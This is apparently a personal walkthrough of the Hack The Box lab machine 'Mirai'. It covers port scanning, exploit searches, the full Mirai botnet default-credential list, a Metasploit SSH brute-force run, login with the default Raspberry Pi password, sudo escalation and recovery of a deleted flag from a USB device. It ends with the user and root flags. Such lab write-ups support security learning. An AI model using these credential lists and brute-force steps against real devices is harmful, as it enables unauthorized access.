# [09 - Mirai](https://app.hackthebox.com/machines/Mirai)

  * [description](#description)
  * [walkthrough](#walkthrough)
    * [recon](#recon)
    * [80](#80)
    * [53](#53)
    * [back to 80](#back-to-80)
    * [32400](#32400)
    * [still digging](#still-digging)
    * [pi](#pi)
  * [flag](#flag)
![Mirai.png](Mirai.png)

## description
> 10.10.10.48

## walkthrough

### recon

```
$ nmap -sC -sV -A -Pn -p- mirai.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-27 16:36 MDT
Nmap scan report for mirai.htb (10.10.10.48)
Host is up (0.060s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Website Blocked
1404/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-title: Unauthorized
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 80

waiting for nmap, looking at 80

```
Website Blocked
Access to the following site has been blocked:
mirai.htb
If you have an ongoing use for this website, please ask the owner of the Pi-hole in your network to have it whitelisted.
This page is blocked because it is explicitly contained within the following block list(s):
Go back Whitelist this page Close window
Generated Wed 10:36 PM, Jul 27 by Pi-hole v3.1.4
```

oh that's interesting.. we're going to have to come back to this

### 53

presumably dnsenum / zone transfer?

```
$ dnsenum --dnsserver mirai.htb --enum mirai.htb -r
dnsenum VERSION:1.2.6

-----   mirai.htb   -----


Host's addresses:
__________________



Name Servers:
______________

 mirai.htb NS record query failed: query timed out
```

```
$ dig axfr mirai.htb @10.10.10.48

; <<>> DiG 9.16.8-Ubuntu <<>> axfr mirai.htb @10.10.10.48
;; global options: +cmd
;; connection timed out; no servers could be reached
```

that's.. not expected. and a straight `nc` command does connect.

### back to 80

watching traffic through burp, see `/admin/scripts/...` calls

hitting `/admin/` itself brings us to the pi-hole dashboard

there are no default credentials, so exploit?

```
msf6 > search pi-hole

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/unix/http/pihole_dhcp_mac_exec          2020-03-28       good       Yes    Pi-Hole DHCP MAC OS Command Execution
   1  exploit/linux/local/pihole_remove_commands_lpe  2021-04-20       great      Yes    Pi-Hole Remove Commands Linux Priv Esc
   2  auxiliary/admin/http/pihole_domains_api_exec    2021-08-04       normal     Yes    Pi-Hole Top Domains API Authenticated Exec
   3  exploit/unix/http/pihole_whitelist_exec         2018-04-15       excellent  Yes    Pi-Hole Whitelist OS Command Execution
   4  exploit/unix/http/pihole_blocklist_exec         2020-05-10       excellent  Yes    Pi-Hole heisenbergCompensator Blocklist OS Command Execution

```

that looks like a path, but all fail with BAD PASSWORD


### 32400

plex that has a login at [http://mirai.htb:32400/web/index.html](http://mirai.htb:32400/web/index.html)

but it also allows "Sign Up" - but any name sent leads to "Username already taken", which is not accurate.

or is it? the POST goes to `https://plex.tv/api/v2/users?X-Plex-Product=Plex Web&X-Plex-Version=3.9.1&X-Plex-Client-Identifier=016n0fqinkcga84rwinvudhl&X-Plex-Platform=Firefox&X-Plex-Platform-Version=101.0&X-Plex-Device=Linux&X-Plex-Device-Name=Plex Web (Firefox)&X-Plex-Device-Screen-Resolution=1908x969,3840x2160`


### still digging

dnsmasq 2.76:
```
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Dnsmasq < 2.50 - Heap Overflow / Null Pointer Dereference                                                                                                   | windows/dos/9617.txt
Dnsmasq < 2.78 - 2-byte Heap Overflow                                                                                                                       | multiple/dos/42941.py
Dnsmasq < 2.78 - Heap Overflow                                                                                                                              | multiple/dos/42942.py
Dnsmasq < 2.78 - Information Leak                                                                                                                           | multiple/dos/42944.py
Dnsmasq < 2.78 - Integer Underflow                                                                                                                          | multiple/dos/42946.py
Dnsmasq < 2.78 - Lack of free() Denial of Service                                                                                                           | multiple/dos/42945.py
Dnsmasq < 2.78 - Stack Overflow                                                                                                                             | multiple/dos/42943.py
dnsmasq-utils 2.79-1 - 'dhcp_release' Denial of Service (PoC)                                                                                               | linux/dos/48301.py
Web Interface for DNSmasq / Mikrotik - SQL Injection                                                                                                        | php/webapps/39817.php
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

so we're vulnerable to all but the first and last 2, but they are DoS, not RCE/file access

lighttpd 1.4.35
```
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
lighttpd - Denial of Service (PoC)                                                                                                                          | linux/dos/18295.txt
Lighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities                                                      | windows/remote/30322.rb
Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                                                                          | multiple/remote/4391.c
Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                                                                          | linux/remote/4437.c
lighttpd 1.4.31 - Denial of Service (PoC)                                                                                                                   | linux/dos/22902.sh
Lighttpd 1.4.x - mod_userdir Information Disclosure                                                                                                         | linux/remote/31396.txt
lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                                                                           | linux/dos/33591.sh
Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure                                                                                                    | multiple/remote/8786.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

no direct hits

Platinum upnp 1.0.5.13


how did mirai actually work - weak credentials.. on ssh.

```
$ cat ~/git/ctf/tools/wordlists/SecLists/Passwords/Malware/mirai-botnet.txt
root xc3511
root vizxv
root admin
admin admin
root 888888
root xmhdipc
root default
root jauntech
root 123456
root 54321
support support
root (none)
admin password
root root
root 12345
user user
admin (none)
root pass
admin admin1234
root 1111
admin smcadmin
admin 1111
root 666666
root password
root 1234
root klv123
Administrator admin
service service
supervisor supervisor
guest guest
guest 12345
admin1 password
administrator 1234
666666 666666
888888 888888
ubnt ubnt
root klv1234
root Zte521
root hi3518
root jvbzd
root anko
root zlxx.
root 7ujMko0vizxv
root 7ujMko0admin
root system
root ikwb
root dreambox
root user
root realtek
root 000000
admin 1111111
admin 1234
admin 12345
admin 54321
admin 123456
admin 7ujMko0admin
admin pass
admin meinsm
tech tech
mother fucker
```

was going down the path of creating password and username lists, when noticed the msf option
```
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
```

yeah this is the way.

```
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS mirai.htb
RHOSTS => mirai.htb
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /home/conor/git/ctf/tools/wordlists/SecLists/Passwords/Malware/mirai-botnet.txt
USERPASS_FILE => /home/conor/git/ctf/tools/wordlists/SecLists/Passwords/Malware/mirai-botnet.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 10.10.10.48:22 - Starting bruteforce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) >
```

hrmm.. or not

```
$ ssh -l pi mirai.htb
Warning: Permanently added 'mirai.htb,10.10.10.48' (ECDSA) to the list of known hosts.
pi@mirai.htb's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```

`pi:raspberry`, which actually showed up on the initial search for default creds.. oi

### pi

```
pi@raspberrypi:~ $ ls -la
total 1509
drwxr-xr-x 21 pi   pi      4096 Jul 29 20:29 .
drwxr-xr-x  4 root root    4096 Aug 13  2017 ..
-rw-------  1 pi   pi        56 Jul 29 20:29 .Xauthority
-rw-r--r--  1 pi   pi        69 Aug 13  2017 .asoundrc
-rw-------  1 pi   pi        18 Dec 24  2017 .bash_history
-rw-r--r--  1 pi   pi       220 Nov 12  2014 .bash_logout
-rw-r--r--  1 pi   pi      3512 Oct 24  2016 .bashrc
drwxr-xr-x  6 pi   pi      4096 Aug 13  2017 .cache
drwx------ 15 pi   pi      4096 Aug 13  2017 .config
drwx------  3 pi   pi      4096 Aug 13  2017 .dbus
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 .gstreamer-0.10
-rw-r--r--  1 pi   pi        26 Aug 13  2017 .gtkrc-2.0
drwxr-xr-x  4 pi   pi      4096 Aug 13  2017 .local
drwx------  3 pi   pi      4096 Aug 13  2017 .pki
-rw-r--r--  1 pi   pi       675 Nov 12  2014 .profile
drwxr-xr-x  3 pi   pi      4096 Aug 13  2017 .themes
drwx------  4 pi   pi      4096 Aug 13  2017 .thumbnails
-rw-------  1 pi   pi       711 Jul 29 20:30 .xsession-errors
-rw-------  1 pi   pi       711 Dec 24  2017 .xsession-errors.old
drwxr-xr-x  3 pi   pi      4096 Aug 13  2017 Desktop
drwxr-xr-x  5 pi   pi        99 Dec 13  2016 Documents
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Downloads
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Music
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Pictures
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Public
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Templates
drwxr-xr-x  2 pi   pi      4096 Aug 13  2017 Videos
-rw-r--r--  1 pi   pi   1441764 Aug 13  2017 background.jpg
drwxr-xr-x  3 pi   pi      4096 Aug 13  2017 oldconffiles
drwxr-xr-x  2 pi   pi      1629 Dec 13  2016 python_games
pi@raspberrypi:~ $ find . -iname user.txt
./Desktop/user.txt
pi@raspberrypi:~ $ cat Desktop/user.txt
ff837707441b257a20e32199d7c8838d
```

user down.

```
pi@raspberrypi:~ $ tree -a oldconffiles/
oldconffiles/
└── .config
    ├── openbox
    │   └── lxde-pi-rc.xml
    └── pcmanfm
        └── LXDE-pi
            └── desktop-items-0.conf

4 directories, 2 files

```

but nothing popping

```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

oh.

```
pi@raspberrypi:~ $ sudo cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

ok, that is a deviation..

```
pi@raspberrypi:~ $ ls -la /media/usbstick/
total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
pi@raspberrypi:~ $ cat /media/usbstick/damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/usr/share/gdb/python/gdb/command/type_printers.pyc
/usr/share/gdb/python/gdb/command/prompt.pyc
/usr/share/gdb/python/gdb/command/__init__.pyc
/usr/share/gdb/python/gdb/command/bound_registers.pyc
/usr/share/gdb/python/gdb/command/pretty_printers.pyc
/usr/share/gdb/python/gdb/command/explore.pyc
/usr/share/gdb/python/gdb/command/frame_filters.pyc
/usr/share/gdb/python/gdb/prompt.pyc
/usr/share/gdb/python/gdb/printing.pyc
/usr/share/gdb/python/gdb/frames.pyc
/usr/share/gdb/python/gdb/__init__.pyc
/usr/share/gdb/python/gdb/FrameDecorator.pyc
/usr/share/gdb/python/gdb/types.pyc
/usr/share/gdb/python/gdb/FrameIterator.pyc
/usr/share/gdb/python/gdb/function/strfns.pyc
/usr/share/gdb/python/gdb/function/__init__.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/type_printers.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/prompt.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/__init__.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/bound_registers.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/pretty_printers.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/explore.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/command/frame_filters.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/prompt.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/printing.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/frames.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/__init__.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/FrameDecorator.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/types.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/FrameIterator.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/function/strfns.pyc
/lib/live/mount/persistence/sda2/usr/share/gdb/python/gdb/function/__init__.pyc
/lib/live/mount/persistence/sda2/etc/pihole/pihole-FTL.db
/lib/live/mount/persistence/sda2/var/log/syslog
/lib/live/mount/persistence/sda2/var/log/pihole.log
/lib/live/mount/persistence/sda2/var/log/daemon.log
/lib/live/mount/persistence/sda2/var/log/auth.log
/lib/live/mount/persistence/sda2/var/log/kern.log
/lib/live/mount/persistence/sda2/var/log/messages
/lib/live/mount/persistence/sda2/var/lib/plexmediaserver/Library/Application Support/Plex Media Server/Logs/Plex Media Server.log
/lib/live/mount/persistence/sda2/root/.gnupg/gpg.conf
/lib/live/mount/persistence/sda2/root/.gnupg/pubring.gpg
/lib/live/mount/persistence/sda2/root/.gnupg/trustdb.gpg
/etc/pihole/pihole-FTL.db
/var/log/syslog
/var/log/pihole.log
/var/log/daemon.log
/var/log/auth.log
/var/log/kern.log
/var/log/messages
/root/.gnupg/gpg.conf
/root/.gnupg/pubring.gpg
/root/.gnupg/trustdb.gpg
```

those are interesting files.. but not following the 'recover deleted file' path

following [https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html](https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html)

```
root@raspberrypi:~# mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755)
/dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime)
/dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime)
tmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime)
/dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered)
aufs on / type aufs (rw,noatime,si=a36c382a,noxino)
devtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
tmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
root@raspberrypi:~# debugfs -w /dev/sdb
debugfs 1.42.12 (29-Aug-2014)
...
```

but `lsdel` reports no deleted files..

however, in linux, "everything is a file", so:
```
root@raspberrypi:~# strings -n 10 /dev/sdb
/media/usbstick
lost+found
damnit.txt
/media/usbstick
lost+found
damnit.txt
/media/usbstick
lost+found
damnit.txt
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
```

and indeed, that is the root flag.

one of the more interesting, if basic-when-you-know-what-you're-looking-for machines played recently.

## flag
```
user:ff837707441b257a20e32199d7c8838d
root:3d3e483143ff12ec505d026fa13e020b
```